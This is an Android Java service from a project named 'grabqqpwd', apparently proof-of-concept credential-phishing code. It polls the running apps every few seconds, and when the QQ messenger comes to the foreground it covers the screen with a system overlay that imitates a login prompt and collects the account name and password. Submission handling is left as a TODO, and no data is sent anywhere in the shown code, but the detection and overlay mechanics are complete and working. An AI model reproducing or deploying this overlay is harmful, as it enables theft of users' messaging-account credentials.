package com.android.grabqqpwd;

import android.app.ActivityManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.text.TextUtils;
import android.text.method.HideReturnsTransformationMethod;
import android.text.method.PasswordTransformationMethod;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.CompoundButton;
import android.widget.EditText;

import com.jaredrummler.android.processes.ProcessManager;

import java.lang.reflect.Field;
import java.util.List;

/**
 * Description: #TODO
 *
 * @author zzp(zhao_zepeng@hotmail.com)
 * @since 2016-01-08
 */
public class BackgroundDetectService extends Service implements View.OnClickListener{

    WindowManager windowManager;
    RelativeLayoutWithKeyDetect v;
    Button btn_sure;
    Button btn_cancel;

    EditText et_account;
    EditText et_pwd;

    CheckBox cb_showpwd;

    boolean isRunning = true;

    @Override
    public void onCreate() {
        super.onCreate();
        final MyHandler myHandler = new MyHandler();
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (isRunning){
                    L.e("running");
                    try {
                        Thread.sleep(3000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    if (isAppForeground("com.tencent.mobileqq")){
                        myHandler.sendEmptyMessage(1);
                    }
                }
            }
        }).start();
    }

    private boolean isAppForeground(String appName){
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP){
            return appName.equals(getTopActivityBeforeL());
        }else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M){
            return appName.equals(getTopActivityAfterM());
        }else{
            return appName.equals(getTopActivityBeforeMAfterL());
        }
    }

    private String getTopActivityBeforeL(){
        ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        final List<ActivityManager.RunningTaskInfo> taskInfo = activityManager.getRunningTasks(1);
        final ComponentName componentName = taskInfo.get(0).topActivity;
        return componentName.getPackageName();
    }

    //http://stackoverflow.com/questions/24625936/getrunningtasks-doesnt-work-in-android-l
    //processState只能在21版本之后使用
    private String getTopActivityBeforeMAfterL() {
        final int PROCESS_STATE_TOP = 2;
        Field field = null;
        ActivityManager.RunningAppProcessInfo currentInfo = null;
        try {
            field = ActivityManager.RunningAppProcessInfo.class.getDeclaredField("processState");
        } catch (Exception ignored) {
        }
        ActivityManager activityManager = (ActivityManager)getSystemService(Context.ACTIVITY_SERVICE);
        final List<ActivityManager.RunningAppProcessInfo> processInfos = activityManager.getRunningAppProcesses();
        for (ActivityManager.RunningAppProcessInfo processInfo : processInfos) {
            if (processInfo.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND
                    && processInfo.importanceReasonCode == ActivityManager.RunningAppProcessInfo.REASON_UNKNOWN) {
                Integer state = null;
                try {
                    state = field.getInt(processInfo);
                } catch (Exception e) {
                }
                if (state != null && state == PROCESS_STATE_TOP) {
                    currentInfo = processInfo;
                    break;
                }
            }
        }
        return currentInfo!=null ? currentInfo.processName : null;
    }

    //注：6.0之后此方法也不太好用了。。。求帮忙
    //http://stackoverflow.com/questions/30619349/android-5-1-1-and-above-getrunningappprocesses-returns-my-application-packag
    private String getTopActivityAfterM(){
        ActivityManager.RunningAppProcessInfo topActivity =
                ProcessManager.getRunningAppProcessInfo(this).get(0);
        return topActivity.processName;
    }

    private class MyHandler extends Handler{
        @Override
        public void handleMessage(Message msg) {
            if (v==null || !v.isAttachedToWindow())
                showWindow();
        }
    }

    private void showWindow(){
        windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        WindowManager.LayoutParams params = new WindowManager.LayoutParams();
        params.width = WindowManager.LayoutParams.MATCH_PARENT;
        params.height = WindowManager.LayoutParams.MATCH_PARENT;
        params.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
        params.type = WindowManager.LayoutParams.TYPE_SYSTEM_ERROR;
        params.format = PixelFormat.TRANSPARENT;
        params.gravity = Gravity.CENTER;
        params.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_PAN;

        LayoutInflater inflater = LayoutInflater.from(this);
        v = (RelativeLayoutWithKeyDetect) inflater.inflate(R.layout.window, null);
        v.setCallback(new RelativeLayoutWithKeyDetect.IKeyCodeBackCallback() {
            @Override
            public void backCallback() {
                if (v!=null && v.isAttachedToWindow())
                    L.e("remove view ");
                    windowManager.removeViewImmediate(v);
            }
        });

        btn_sure = (Button) v.findViewById(R.id.btn_sure);
        btn_cancel = (Button) v.findViewById(R.id.btn_cancel);
        et_account = (EditText) v.findViewById(R.id.et_account);
        et_pwd = (EditText) v.findViewById(R.id.et_pwd);
        cb_showpwd = (CheckBox) v.findViewById(R.id.cb_showpwd);
        cb_showpwd.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if (isChecked) {
                    et_pwd.setTransformationMethod(HideReturnsTransformationMethod.getInstance());
                } else {
                    et_pwd.setTransformationMethod(PasswordTransformationMethod.getInstance());
                }
                et_pwd.setSelection(TextUtils.isEmpty(et_pwd.getText()) ?
                        0 : et_pwd.getText().length());
            }
        });

        //useless
//        v.setOnKeyListener(new View.OnKeyListener() {
//            @Override
//            public boolean onKey(View v, int keyCode, KeyEvent event) {
//                Log.e("zhao", keyCode+"");
//                if (keyCode == KeyEvent.KEYCODE_BACK) {
//                    windowManager.removeViewImmediate(v);
//                    return true;
//                }
//                return false;
//            }
//        });


        //点击外部消失
        v.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View view, MotionEvent event) {
                Rect temp = new Rect();
                view.getGlobalVisibleRect(temp);
                L.e("remove view ");
                if (temp.contains((int)(event.getX()), (int)(event.getY()))){
                    windowManager.removeViewImmediate(v);
                    return true;
                }
                return false;
            }
        });

        btn_sure.setOnClickListener(this);
        btn_cancel.setOnClickListener(this);
        L.e("add view ");
        windowManager.addView(v, params);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
        L.e("remove view ");
        if (v!=null && v.hasWindowFocus())
            windowManager.removeView(v);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onClick(View view) {
        if (view == btn_cancel){
            if (v!=null && v.hasWindowFocus())
                windowManager.removeViewImmediate(v);
        }else{
            if (TextUtils.isEmpty(et_account.getText())){
                et_account.setError("请输入账号");
                return;
            }

            if (TextUtils.isEmpty(et_pwd.getText())){
                et_pwd.setError("请输入密码");
                return;
            }
            //TODO 用户已经输入用户名和密码，做相应处理即可
            L.e("remove view ");
            if (v!=null && v.hasWindowFocus())
                windowManager.removeViewImmediate(v);
        }
    }
}
